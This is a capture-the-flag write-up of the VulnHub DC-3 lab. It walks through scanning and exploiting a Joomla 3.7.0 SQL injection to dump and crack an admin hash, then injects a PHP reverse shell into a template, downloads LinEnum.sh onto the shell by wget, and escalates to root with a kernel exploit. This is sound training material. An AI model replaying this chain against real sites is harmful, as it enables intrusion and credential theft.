---
title: DC-3 - WRITE-UP
date: 2020-06-08 08:46:00 +0100
categories: [VulnHub, DC]
tags: [beginner, sql-injection, joomla, cms, kernel-exploit, john-the-ripper]
lang: en
---

## MAIN INFORMATION
### BOX NAME: DC: 3.2
### DESCRIPTION
```
DC-3 is another purposely built vulnerable lab with the intent of gaining experience in the world of penetration testing.

As with the previous DC releases, this one is designed with beginners in mind, although this time around, there is only one flag, one entry point, and no clues at all.

Linux skills and familiarity with the Linux command line are a must, as is some experience with basic penetration testing tools.

For beginners, Google can be of great assistance, but you can always tweet me at @ DCAU7 for assistance to get you going again. But take note: I won't give you the answer, instead, I'll give you an idea about how to move forward.

For those with experience doing CTF and Boot2Root challenges, this probably won't take you long at all (in fact, it could take you less than 20 minutes easily).

If that's the case, and if you want it to be a bit more of a challenge, you can always redo the challenge and explore other ways of gaining root and obtaining the flag.
```
## NMAP
```bash
nmap -p- -A -T4 192.168.56.116
Starting Nmap 7.80 (https://nmap.org) at 2020-06-08 08:22 EDT
Nmap scan report for 192.168.56.116
Host is up (0.0032s latency).
Not shown: 65534 closed ports
PORT STATE SERVICE VERSION
80 / tcp open http Apache httpd 2.4.18 ((Ubuntu))
| _http-generator: Joomla! - Open Source Content Management
| _http-server-header: Apache / 2.4.18 (Ubuntu)
| _http-title: Home

Service detection performed. Please report any incorrect results at https://nmap.org/submit/.
Nmap done: 1 IP address (1 host up) scanned in 20.48 seconds
```
We see one open HTTP port. We were unable to get the Joomla version
## GOBUSTER
```bash
$ gobuster dir -w /usr/share/wordlists/dirb/common.txt --url 192.168.56.116
================================================== =============
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
================================================== =============
[+] Url: http://192.168.56.116
[+] Threads: 10
[+] Wordlist: /usr/share/wordlists/dirb/common.txt
[+] Status codes: 200,204,301,302,307,401,403
[+] User Agent: gobuster / 3.0.1
[+] Timeout: 10s
================================================== =============
2020/06/08 08:26:56 Starting gobuster
================================================== =============
/.hta (Status: 403)
/.htaccess (Status: 403)
/.htpasswd (Status: 403)
/ administrator (Status: 301)
/ bin (Status: 301)
/ cache (Status: 301)
/ components (Status: 301)
/ includes (Status: 301)
/ language (Status: 301)
/ layouts (Status: 301)
/ libraries (Status: 301)
/ media (Status: 301)
/ modules (Status: 301)
/ images (Status: 301)
/ plugins (Status: 301)
/ server-status (Status: 403)
/ templates (Status: 301)
/ tmp (Status: 301)
/index.php (Status: 200)
================================================== =============
2020/06/08 08:26:57 Finished
================================================== =============
```
You can see a lot of directories that shouldn't be visible, unfortunately, they don't return any data. However, the directory /administrator is interesting

![Imgur](https://i.imgur.com/Mt695xJ.png)

I tried to do tests on SQL Injection using ```sqlmap```. Unfortunately, neither in the address / administrator nor in /index.php were there any vulnerabilities associated with it.
I also tried brute-force the login panel. It also didn't work.

We are losing track.
Wappalyzer plugin does not detect the Joomla version. Exploit is probably the only way right now, considering Box's difficulty level.
While browsing the internet, I came across the joomscan tool. It is not built into Kali Linux so we have to download it ourselves
## JOOMSCAN
```bash
$ perl joomscan.pl --url http://192.168.56.116


(_ _) (_) (_) (\ /) / __) / __) / __ \ (\ ()
  .-_) () (_) () (_) () (\ __ \ ((__ / (__) \) (
  \ ____) (_____) (_____) (_ / \ / \ _) (___ / \ ___) (__) (__) (_) \ _)
(1337.today)

    - = [OWASP JoomScan
    + --- ++ --- == [Version: 0.0.7
    + --- ++ --- == [Update Date: [2018/09/23]
    + --- ++ --- == [Authors: Mohammad Reza Espargham, Ali Razmjoo
    - = [Code name: Self Challenge
    @OWASP_JoomScan, @rezesp, @ Ali_Razmjo0, @OWASP

Processing http://192.168.56.116 ...



[+] FireWall Detector
[++] Firewall not detected

[+] Detecting Joomla Version
[++] Joomla 3.7.0

[+] Core Joomla Vulnerability
[++] Target Joomla core is not vulnerable

[+] Checking Directory Listing
[++] directory has directory listing:
http://192.168.56.116/administrator/components
http://192.168.56.116/administrator/modules
http://192.168.56.116/administrator/templates
http://192.168.56.116/images/banners


[+] Checking apache info / status files
[++] Readable info / status files are not found

[+] admin finder
[++] Admin page: http://192.168.56.116/administrator/

[+] Checking robots.txt existing
[++] robots.txt is not found

[+] Finding common backup files name
[++] Backup files are not found[+] Finding common log files name
[++] error log is not found

[+] Checking sensitive config.php.x file
[++] Readable config files are not found



Your Report: reports / 192.168.56.116 /

```
The tool gives us information about the Joomly version, so let's check on Google if there are any exploits for this version
I come across:

## JOOMBLAH
[GitHub exploit] (https://github.com/stefanlucas/Exploit-Joomla/blob/master/joomblah.py)

I perform:

```bash
python joomblah.py http://192.168.56.116:80

    .---. .-'''-. .-'''-.
    | | '_ \' _ \ .---.
    '---' / / ''. \ / / ''. \ __ __ ___ / | | | .
    .--- .. | \ '. | \ '| | / `. ' '. || | | . '|
    | || '| '| '| '| .-. .-. '|| | | <|
    | | \ \ / / \ \ / / | | | | | ||| __ | | __ | |
    | | '. `.. '/`. `.. '/ | | | | | ||| / '__'. | | .: -. '. | | .''-.
    | | '-...-' ```-...- '' | | | | | ||: / `'. '| | / | \ | | | /. '' '. \
    | | | | | | | ||| | || | `" __ | | | / | |
    | | | __ | | __ | | __ ||| \ / '| | . '.' '| | | | | |
 __. ' '| /' .. '/' --- '/ / | | _ | | | |
| '' `'-'` \ \ ._, \' / | '. | '.
| ____. ' `- '` "' --- '' --- '

 [-] Fetching CSRF token
 [-] Testing SQLi
  - Found table: d8uea_users
  - Found table: users
  - Extracting users from d8uea_users
 [$] Found user ['629', 'admin', 'admin', 'freddy@norealaddress.net', '$ 2y $ 10 $ DpfpYjADpejngxNh9GnmCeyIHCWpL97CVRnGeZsVJwR0kWFlfB1Zu', '', '']
  - Extracting sessions from d8uea_session
  - Extracting users from users
  - Extracting sessions from session
```

## BREAKING HASH - JOHN THE RIPPER
So we have hash "$ 2y $ 10 $ DpfpYjADpejngxNh9GnmCeyIHCWpL97CVRnGeZsVJwR0kWFlfB1Zu" for admin

I'm trying to break it with John the Ripper:

```bash
$ john hash.txt --wordlist /usr/share/wordlists/rockyou.txt
Warning: only loading hashes of type "bcrypt", but also saw type "tripcode"
Use the "--format = tripcode" option to force loading hashes of that type instead
Warning: only loading hashes of type "bcrypt", but also saw type "descrypt"
Use the "--format = descrypt" option to force loading hashes of that type instead
Warning: only loading hashes of type "bcrypt", but also saw type "pix-md5"
Use the "--format = pix-md5" option to force loading hashes of that type instead
Warning: only loading hashes of type "bcrypt", but also saw type "mysql"
Use the "--format = mysql" option to force loading hashes of that type instead
Warning: only loading hashes of type "bcrypt", but also saw type "oracle"
Use the "--format = oracle" option to force loading hashes of that type instead
Warning: only loading hashes of type "bcrypt", but also saw type "Raw-SHA1"
Use the "--format = Raw-SHA1" option to force loading hashes of that type instead
pe instead
Warning: only loading hashes of type "bcrypt", but also saw type "bsdicrypt"
Use the "--format = bsdicrypt" option to force loading hashes of that type instead
Warning: only loading hashes of type "bcrypt", but also saw type "HMAC-SHA384"
Use the "--format = HMAC-SHA384" option to force loading hashes of that type instead
Warning: only loading hashes of type "bcrypt", but also saw type "oracle11"
Use the "--format = oracle11" option to force loading hashes of that type instead
Warning: only loading hashes of type "bcrypt", but also saw type "xsha"
Use the "--format = xsha" option to force loading hashes of that type instead
Warning: only loading hashes of type "bcrypt", but also saw type "lotus85"
Use the "--format = lotus85" option to force loading hashes of that type instead
Warning: only loading hashes of type "bcrypt", but also saw type "HAVAL-256-3"
Use the "--format = HAVAL-256-3" option to force loading hashes of that type instead
Warning: only loading hashes of type "bcrypt", but also saw type "plaintext"
Use the "--format = plaintext" option to force loading hashes of that type instead
Using default input encoding: UTF-8
Loaded 1 password hash (bcrypt [Blowfish 32/64 X3])
Cost 1 (iteration count) is 1024 for all loaded hashes
Will run 2 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
snoopy (?)
1g 0: 00: 00: 01 DONE (2020-06-09 04:56) 0.6993g / s 25.17p / s 25.17c / s 25.17C / s a1b2c3..buster
Use the "--show" option to display all of the cracked passwords reliably
Session completed
```
So the password is "snoopy"
When logged in, in the directory / administrator we see the following panel:

![Imgur](https://i.imgur.com/28njP89.png)
## REVERSE SHELL
How to get reverse shell now? Googling I came across a reverse shell injection method in the Joomla template. Do you remember the gobuster results? There was also a folder /templates in them. I come across this reverse shell example [PentestMonkey_Reverse-Shell] (https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php)

We are changing the content of ```index.php```for the main template in this case (Protostar). Let's remember to change ip to ours: P

![Imgur](https://i.imgur.com/Htug6TJ.png)

The next time you go to the main page, you get a reverse shell

I improve with "python -c" import pty; pty.spawn ('/ bin / bash') "

Nothing catches the eye, so I'm going to send the script ```LinEnum.sh```to the reverse shell.

I will do this with SimpleHTTPServer while I already have the script in the same directory.
```bash
$ python -m SimpleHTTPServer
```
On the reverse-shell, in the / tmp directory, I do a simple wget.
```bash
wget 192.168.56.103:8000/LinEnum.sh
```
## EXPLOITATION
### LINUX-EXPLOIT-SUGGESTOR
The script did not produce revealing results. There is another enumeration script called ```linux-exploit-suggestor```
```bash
$ ./linux-exploit-suggester.sh

Available information:

Kernel version: 4.4.0
Architecture: i686
Distribution: ubuntu
Distribution version: 16.04
Additional checks (CONFIG_ *, sysctl entries, custom Bash commands): performed
Package listing: from current OS

Searching among:

74 kernel space exploits
45 user space exploits

Possible Exploits:

cat: write error: Broken pipe
cat: write error: Broken pipe
cat: write error: Broken pipe
cat: write error: Broken pipe
cat: write error: Broken pipe
cat: write error: Broken pipe
cat: write error: Broken pipe
cat: write error: Broken pipe
cat: write error: Broken pipe
[+] [CVE-2016-5195] dirtycow 2

   Details: https://github.com/dirtycow/dirtycow.github.io/wiki/VulnerabilityDetails
   Exposure: highly probable
   Tags: debian = 7 | 8, RHEL = 5 | 6 | 7, ubuntu = 14.04 | 12.04, ubuntu = 10.04 {kernel: 2.6.32-21-generic}, [ubuntu = 16.04 {kernel: 4.4.0-21- generic}]
   Download URL: https://www.exploit-db.com/download/40839
   ext-url: https://www.exploit-db.com/download/40847.cpp
   Comments: For RHEL / CentOS see exact vulnerable versions here: https://access.redhat.com/sites/default/files/rh-cve-2016-5195_5.sh

[+] [CVE-2017-16995] eBPF_verifier

   Details: https://ricklarabee.blogspot.com/2018/07/ebpf-and-analysis-of-get-rekt-linux.html
   Exposure: highly probable
   Tags: debian = 9.0 {kernel: 4.9.0-3-amd64}, fedora = 25 | 26 | 27, ubuntu = 14.04 {kernel: 4.4.0-89-generic}, [ubuntu = (16.04 | 17.04)] { kernel: 4. (8 | 10) .0- (19 | 28 | 45) -generic}
   Download URL: https://www.exploit-db.com/download/45010
   Comments: CONFIG_BPF_SYSCALL needs to be set && kernel.unprivileged_bpf_disabled! = 1

[+] [CVE-2016-8655] chocobo_root

   Details: http://www.openwall.com/lists/oss-security/2016/12/06/1
   Exposure: highly probable
   Tags: [ubuntu = (14.04 | 16.04) {kernel: 4.4.0- (21 | 22 | 24 | 28 | 31 | 34 | 36 | 38 | 42 | 43 | 45 | 47 | 51) -generic}]
   Download URL: https://www.exploit-db.com/download/40871
   Comments: CAP_NET_RAW capability is needed OR CONFIG_USER_NS = y needs to be enabled

[+] [CVE-2016-5195] dirtycow

   Details: https://github.com/dirtycow/dirtycow.github.io/wiki/VulnerabilityDetails
   Exposure: highly probable
   Tags: debian = 7 | 8, RHEL = 5 {kernel: 2.6. (18 | 24 | 33) - *}, RHEL = 6 {kernel: 2.6.32- * | 3. (0 | 2 | 6 | 8 | 10). * | 2.6.33.9-rt31}, RHEL = 7 {kernel: 3.10.0- * | 4.2.0-0.21.el7}, [ubuntu = 04/16 | 04/14 | 04/12]
   Download URL: https://www.exploit-db.com/download/40611
   Comments: For RHEL / CentOS see exact vulnerable versions here: https://access.redhat.com/sites/default/files/rh-cve-2016-5195_5.sh

[+] [CVE-2016-4557] double-fdput ()

   Details: https://bugs.chromium.org/p/project-zero/issues/detail?id=808
   Exposure: highly probable
   Tags: [ubuntu = 16.04 {kernel: 4.4.0-21-generic}]
   Download URL: https://github.com/offensive-security/exploit-database-bin-sploits/raw/master/bin-sploits/39772.zip
   Comments: CONFIG_BPF_SYSCALL needs to be set && kernel.unprivileged_bpf_disabled! = 1

[+] [CVE-2017-7308] af_packet

   Details: https://googleprojectzero.blogspot.com/2017/05/exploiting-linux-kernel-via-packet.html
   Exposure: probable
   Tags: [ubuntu = 04/16] {kernel: 4.8.0- (34 | 36 | 39 | 41 | 42 | 44 | 45) -generic}
   Download URL: https://raw.githubusercontent.com/xairy/kernel-exploits/master/CVE-2017-7308/poc.c
   ext-url: https://raw.githubusercontent.com/bcoles/kernel-exploits/master/CVE-2017-7308/poc.c
   Comments: CAP_NET_RAW cap or CONFIG_USER_NS = y needed. Modified version at 'ext-url' adds support for additional kernels

[+] [CVE-2017-6074] dccp

   Details: http://www.openwall.com/lists/oss-security/2017/02/22/3
   Exposure: probable
   Tags: [ubuntu = (14/04 | 16/04)] {kernel: 4.4.0-62-generic}
   Download URL: https://www.exploit-db.com/download/41458
   Comments: Requires Kernel be built with CONF
   IG_IP_DCCP enabled. Includes partial SMEP / SMAP bypass

[+] [CVE-2017-1000112] NETIF_F_UFO

   Details: http://www.openwall.com/lists/oss-security/2017/08/13/1
   Exposure: probable
   Tags: ubuntu = 14.04 {kernel: 4.4.0 - *}, [ubuntu = 16.04] {kernel: 4.8.0- *}
   Download URL: https://raw.githubusercontent.com/xairy/kernel-exploits/master/CVE-2017-1000112/poc.c
   ext-url: https://raw.githubusercontent.com/bcoles/kernel-exploits/master/CVE-2017-1000112/poc.c
   Comments: CAP_NET_ADMIN cap or CONFIG_USER_NS = y needed. SMEP / KASLR bypass included. Modified version at 'ext-url' adds support for additional distros / kernels

[+] [CVE-2019-18634] sudo pwfeedback

   Details: https://dylankatz.com/Analysis-of-CVE-2019-18634/
   Exposure: less probable
   Tags: mint = 19
   Download URL: https://github.com/saleemrashid/sudo-cve-2019-18634/raw/master/exploit.c
   Comments: sudo configuration requires pwfeedback to be enabled.

```

I tried a few of them, but the double-fdput () exploit only worked.

We repeat the methodology of sending files to the remote-shell

We follow the instructions here [PROJECT-ZERO](https://bugs.chromium.org/p/project-zero/issues/detail?id=808)

After executing the exploit, we can see from the ```id```command that we have root.
I leave the flag for myself, for motivation to make this Box myself later :P
